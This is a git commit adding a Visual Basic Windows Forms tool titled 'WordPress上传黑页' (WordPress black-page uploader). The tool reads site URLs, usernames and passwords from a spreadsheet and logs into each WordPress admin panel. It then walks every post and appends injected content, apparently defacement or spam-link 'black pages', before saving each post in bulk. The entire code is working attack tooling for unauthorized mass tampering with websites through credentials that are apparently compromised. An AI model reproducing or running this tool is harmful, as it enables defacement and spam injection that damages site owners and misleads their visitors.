6b31acdd86071436c0b031087ddd8de65739e5eb
QIPA-71 <31050018+QIPA-71@users.noreply.github.com>
2018-04-05 10:43:55 -0700

    WordPress上传黑页
    WordPress文章批量上传黑页

---
+++ wordpress上传黑页/wordpress上传黑页/Form1.Designer.vb
@@ -0,0 +1,279 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form 重写 Dispose，以清理组件列表。
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Windows 窗体设计器所必需的
+    Private components As System.ComponentModel.IContainer
+
+    '注意: 以下过程是 Windows 窗体设计器所必需的
+    '可以使用 Windows 窗体设计器修改它。  
+    '不要使用代码编辑器修改它。
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.WebBrowser1 = New System.Windows.Forms.WebBrowser()
+        Me.ListBox1 = New System.Windows.Forms.ListBox()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.ListBox2 = New System.Windows.Forms.ListBox()
+        Me.ListBox3 = New System.Windows.Forms.ListBox()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.OpenFileDialog1 = New System.Windows.Forms.OpenFileDialog()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.ListBox4 = New System.Windows.Forms.ListBox()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.WebBrowser2 = New System.Windows.Forms.WebBrowser()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.Button6 = New System.Windows.Forms.Button()
+        Me.Button7 = New System.Windows.Forms.Button()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.TextBox3 = New System.Windows.Forms.TextBox()
+        Me.Label4 = New System.Windows.Forms.Label()
+        Me.SuspendLayout()
+        '
+        'WebBrowser1
+        '
+        Me.WebBrowser1.Location = New System.Drawing.Point(357, 338)
+        Me.WebBrowser1.MinimumSize = New System.Drawing.Size(20, 20)
+        Me.WebBrowser1.Name = "WebBrowser1"
+        Me.WebBrowser1.Size = New System.Drawing.Size(345, 298)
+        Me.WebBrowser1.TabIndex = 0
+        Me.WebBrowser1.Url = New System.Uri("", System.UriKind.Relative)
+        '
+        'ListBox1
+        '
+        Me.ListBox1.FormattingEnabled = True
+        Me.ListBox1.ItemHeight = 12
+        Me.ListBox1.Location = New System.Drawing.Point(6, 28)
+        Me.ListBox1.Name = "ListBox1"
+        Me.ListBox1.Size = New System.Drawing.Size(100, 304)
+        Me.ListBox1.TabIndex = 1
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(6, 338)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(100, 38)
+        Me.Button1.TabIndex = 2
+        Me.Button1.Text = "打开表格"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'ListBox2
+        '
+        Me.ListBox2.FormattingEnabled = True
+        Me.ListBox2.ItemHeight = 12
+        Me.ListBox2.Location = New System.Drawing.Point(112, 28)
+        Me.ListBox2.Name = "ListBox2"
+        Me.ListBox2.Size = New System.Drawing.Size(90, 304)
+        Me.ListBox2.TabIndex = 3
+        '
+        'ListBox3
+        '
+        Me.ListBox3.FormattingEnabled = True
+        Me.ListBox3.ItemHeight = 12
+        Me.ListBox3.Location = New System.Drawing.Point(208, 28)
+        Me.ListBox3.Name = "ListBox3"
+        Me.ListBox3.Size = New System.Drawing.Size(90, 304)
+        Me.ListBox3.TabIndex = 4
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("宋体", 12.0!)
+        Me.Label1.Location = New System.Drawing.Point(3, 9)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(40, 16)
+        Me.Label1.TabIndex = 5
+        Me.Label1.Text = "网站"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Font = New System.Drawing.Font("宋体", 12.0!)
+        Me.Label2.Location = New System.Drawing.Point(109, 9)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(40, 16)
+        Me.Label2.TabIndex = 6
+        Me.Label2.Text = "账号"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Font = New System.Drawing.Font("宋体", 12.0!)
+        Me.Label3.Location = New System.Drawing.Point(205, 9)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(40, 16)
+        Me.Label3.TabIndex = 7
+        Me.Label3.Text = "密码"
+        '
+        'OpenFileDialog1
+        '
+        Me.OpenFileDialog1.FileName = "OpenFileDialog1"
+        Me.OpenFileDialog1.Filter = "表格(*.xlsx)|*.xlsx|所有文件(*.*)|*.*"
+        Me.OpenFileDialog1.Title = "打开表格"
+        '
+        'Button2
+        '
+        Me.Button2.Location = New System.Drawing.Point(112, 338)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(120, 40)
+        Me.Button2.TabIndex = 8
+        Me.Button2.Text = "登陆"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'ListBox4
+        '
+        Me.ListBox4.FormattingEnabled = True
+        Me.ListBox4.ItemHeight = 12
+        Me.ListBox4.Location = New System.Drawing.Point(304, 28)
+        Me.ListBox4.Name = "ListBox4"
+        Me.ListBox4.Size = New System.Drawing.Size(47, 304)
+        Me.ListBox4.TabIndex = 12
+        '
+        'Button4
+        '
+        Me.Button4.Location = New System.Drawing.Point(238, 337)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(112, 109)
+        Me.Button4.TabIndex = 13
+        Me.Button4.Text = "开始"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'WebBrowser2
+        '
+        Me.WebBrowser2.Location = New System.Drawing.Point(357, 2)
+        Me.WebBrowser2.MinimumSize = New System.Drawing.Size(20, 20)
+        Me.WebBrowser2.Name = "WebBrowser2"
+        Me.WebBrowser2.Size = New System.Drawing.Size(345, 330)
+        Me.WebBrowser2.TabIndex = 15
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Location = New System.Drawing.Point(6, 382)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(113, 21)
+        Me.TextBox2.TabIndex = 16
+        Me.TextBox2.Text = "当前"
+        '
+        'Button6
+        '
+        Me.Button6.Location = New System.Drawing.Point(112, 411)
+        Me.Button6.Name = "Button6"
+        Me.Button6.Size = New System.Drawing.Size(120, 38)
+        Me.Button6.TabIndex = 17
+        Me.Button6.Text = "保存"
+        Me.Button6.UseVisualStyleBackColor = True
+        '
+        'Button7
+        '
+        Me.Button7.Location = New System.Drawing.Point(6, 409)
+        Me.Button7.Name = "Button7"
+        Me.Button7.Size = New System.Drawing.Size(100, 40)
+        Me.Button7.TabIndex = 18
+        Me.Button7.Text = "STOP"
+        Me.Button7.UseVisualStyleBackColor = True
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(7, 452)
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(343, 33)
+        Me.ProgressBar1.TabIndex = 19
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Location = New System.Drawing.Point(6, 491)
+        Me.TextBox1.MaxLength = 3276700
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.ScrollBars = System.Windows.Forms.ScrollBars.Both
+        Me.TextBox1.Size = New System.Drawing.Size(344, 145)
+        Me.TextBox1.TabIndex = 20
+        Me.TextBox1.Text = resources.GetString("TextBox1.Text")
+        Me.TextBox1.WordWrap = False
+        '
+        'TextBox3
+        '
+        Me.TextBox3.Location = New System.Drawing.Point(184, 382)
+        Me.TextBox3.Name = "TextBox3"
+        Me.TextBox3.Size = New System.Drawing.Size(48, 21)
+        Me.TextBox3.TabIndex = 21
+        Me.TextBox3.Text = "2"
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.Location = New System.Drawing.Point(124, 382)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(59, 24)
+        Me.Label4.TabIndex = 22
+        Me.Label4.Text = "挂载页数:" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & " 0为所有" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 12.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(707, 639)
+        Me.Controls.Add(Me.Label4)
+        Me.Controls.Add(Me.TextBox3)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.Controls.Add(Me.Button7)
+        Me.Controls.Add(Me.Button6)
+        Me.Controls.Add(Me.TextBox2)
+        Me.Controls.Add(Me.WebBrowser2)
+        Me.Controls.Add(Me.Button4)
+        Me.Controls.Add(Me.ListBox4)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.ListBox3)
+        Me.Controls.Add(Me.ListBox2)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.ListBox1)
+        Me.Controls.Add(Me.WebBrowser1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.Name = "Form1"
+        Me.Text = "WordPress上传黑页"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents WebBrowser1 As WebBrowser
+    Friend WithEvents ListBox1 As ListBox
+    Friend WithEvents Button1 As Button
+    Friend WithEvents ListBox2 As ListBox
+    Friend WithEvents ListBox3 As ListBox
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label3 As Label
+    Friend WithEvents OpenFileDialog1 As OpenFileDialog
+    Friend WithEvents Button2 As Button
+    Friend WithEvents ListBox4 As ListBox
+    Friend WithEvents Button4 As Button
+    Friend WithEvents WebBrowser2 As WebBrowser
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents Button6 As Button
+    Friend WithEvents Button7 As Button
+    Friend WithEvents ProgressBar1 As ProgressBar
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents TextBox3 As TextBox
+    Friend WithEvents Label4 As Label
+End Class
---
+++ wordpress上传黑页/wordpress上传黑页/Form1.vb
@@ -0,0 +1,189 @@
+﻿Imports System.ComponentModel
+Imports System.Threading
+
+
+Public Class Form1
+    Dim xlapp As Microsoft.Office.Interop.Excel.Application = New Microsoft.Office.Interop.Excel.Application
+    Dim xlbook As Microsoft.Office.Interop.Excel.Workbook
+    Dim xlsheet As Microsoft.Office.Interop.Excel.Worksheet
+    Dim a As String = 0
+    Dim url As String
+    Dim HtmlData As String
+    Dim HtmlData2 As Object
+    Dim Text1 As String
+    Dim Text2 As String
+    Dim Text3 As String
+    Dim DataTou As String
+    Dim DataWei As String
+    Dim yemian As Integer = 2
+    Dim yeshu As Integer
+    Dim pd As Boolean = True
+    Dim ses As Integer = 0
+    Dim pds As Boolean = True
+    Delegate Sub wt(ByVal g As String)
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        xlapp.DisplayAlerts = False
+        If OpenFileDialog1.ShowDialog() = DialogResult.OK Then
+            xlbook = xlapp.Workbooks.Open(OpenFileDialog1.FileName)
+            xlsheet = xlbook.Sheets(1)
+            For i = 1 To xlsheet.UsedRange.Rows.Count  '表格高度
+                ListBox1.Items.Add(xlsheet.Range("A" & i).Value)
+                ListBox2.Items.Add(xlsheet.Range("B" & i).Value)
+                ListBox3.Items.Add(xlsheet.Range("C" & i).Value)
+            Next
+        End If
+        'TextBox2.Text = xlsheet.UsedRange.Columns.Count 获取表格宽度
+        'TextBox3.Text = xlsheet.UsedRange.Rows.Count   获取表格高度
+
+    End Sub
+
+    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
+        Try
+            xlapp.ActiveWorkbook.Close(SaveChanges:=True)
+        Catch ex As Exception
+
+        End Try
+        xlsheet = Nothing
+        xlbook = Nothing
+        xlapp.Quit()
+        xlapp = Nothing
+        GC.Collect()
+    End Sub
+
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
+        Try
+            ListBox4.Items.Clear()
+            WebBrowser1.Document.All("user_login").SetAttribute("value", ListBox2.SelectedItem)
+            WebBrowser1.Document.All("user_pass").SetAttribute("value", ListBox3.SelectedItem)
+            WebBrowser1.Document.Forms(0).InvokeMember("submit")
+            While (WebBrowser1.ReadyState = WebBrowserReadyState.Complete)
+                Application.DoEvents()
+            End While
+            WebBrowser1.Navigate(url & "wp-admin/edit.php")
+            While (WebBrowser1.ReadyState = WebBrowserReadyState.Complete)
+                Application.DoEvents()
+            End While
+        Catch ex As Exception
+            MsgBox(ex)
+        End Try
+
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Control.CheckForIllegalCrossThreadCalls = False
+        WebBrowser1.ScriptErrorsSuppressed = True
+        WebBrowser2.ScriptErrorsSuppressed = True
+    End Sub
+
+    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
+
+        HtmlData = Me.WebBrowser1.DocumentText
+        If InStr(HtmlData, "amp;action=edit") > 0 Then
+            ye()
+            While InStr(HtmlData, "amp;action=edit") > 0
+                Text2 = Mid(HtmlData, InStr(HtmlData, "amp;action=edit") - 5, 4)
+                Text2 = Replace(Text2, "=", "")
+                Text2 = Replace(Text2, Chr(38), "")
+                If ListBox4.Items.Contains(Text2) = False Then
+                    ListBox4.Items.Add(Text2)
+                End If
+
+                HtmlData = Mid(HtmlData, InStr(HtmlData, "&amp;action=edit") + 20, HtmlData.Length)
+            End While
+            'If yemian < yeshu / 4 Then    修改页面
+            If TextBox3.Text = "0" Then
+                If yemian < yeshu + 1 Then
+                    WebBrowser1.Navigate(url & "wp-admin/edit.php?paged=" & yemian)
+                    yemian = yemian + 1
+                End If
+            Else
+                If yemian < TextBox3.Text + 1 Then
+                    WebBrowser1.Navigate(url & "wp-admin/edit.php?paged=" & yemian)
+                    yemian = yemian + 1
+                End If
+            End If
+
+
+
+        End If
+    End Sub
+
+    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
+        Try
+            WebBrowser2.Navigate(url & "wp-admin/post.php?post=" & ListBox4.Items(ses) & Chr(38) & "action=edit")
+            If ProgressBar1.Maximum <> ListBox4.Items.Count Then
+                ProgressBar1.Maximum = ListBox4.Items.Count
+            End If
+            ProgressBar1.Value = ses
+        Catch ex As Exception
+            MsgBox(ex)
+        End Try
+
+    End Sub
+
+    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
+        Dim A As HtmlElement
+        For Each A In WebBrowser2.Document.GetElementsByTagName("INPUT")
+            If A.DomElement.Type = "submit" And A.DomElement.name = "save" Then
+                A.InvokeMember("Click")
+            End If
+        Next
+        If ListBox4.Items.Count > ses Then
+            ses = ses + 1
+            ListBox4.SelectedIndex = ses
+            Button4_Click(Nothing, Nothing)
+        Else
+            ses = 0
+            pds = False
+            MsgBox("上传完毕")
+            ListBox4.Items.Clear()
+            WebBrowser2.Navigate("www.baidu.com")
+        End If
+
+    End Sub
+    Private Sub ye()
+        If pd Then
+            Text3 = Mid(WebBrowser1.DocumentText, InStr(WebBrowser1.DocumentText, "last-page"), 100)
+            Text1 = Mid(Text3, InStr(Text3, "paged=") + 6, 2)
+            If Text1.Length > 1 Then
+                If Mid(Text1, 2, 1) = Chr(34) Then
+                    Text1 = Mid(Text1, 1, 1)
+                    yeshu = CType(Text1, Integer)
+                End If
+                yeshu = CType(Text1, Integer)
+            End If
+        End If
+        pd = False
+    End Sub
+
+    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
+        ListBox4.Items.Clear()
+    End Sub
+
+    Private Sub WebBrowser2_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser2.DocumentCompleted
+        HtmlData2 = WebBrowser2.DocumentText
+        If pds Then
+            If InStr(HtmlData2, "action=edit") > 0 Then
+                Me.WebBrowser2.Document.GetElementById("content").InnerText = Me.WebBrowser2.Document.GetElementById("content").InnerText & Chr("10") & TextBox1.Text
+                Button6_Click(Nothing, Nothing)
+            End If
+        End If
+
+
+    End Sub
+
+    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
+        pds = True
+        ListBox4.Items.Clear()
+        ListBox2.SelectedIndex = ListBox1.SelectedIndex
+        ListBox3.SelectedIndex = ListBox1.SelectedIndex
+        url = ListBox1.SelectedItem
+        WebBrowser1.Navigate(url & "wp-login.php")
+    End Sub
+
+    Private Sub ListBox4_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox4.SelectedIndexChanged
+        ses = ListBox4.SelectedIndex
+        Button4_Click(Nothing, Nothing)
+    End Sub
+End Class
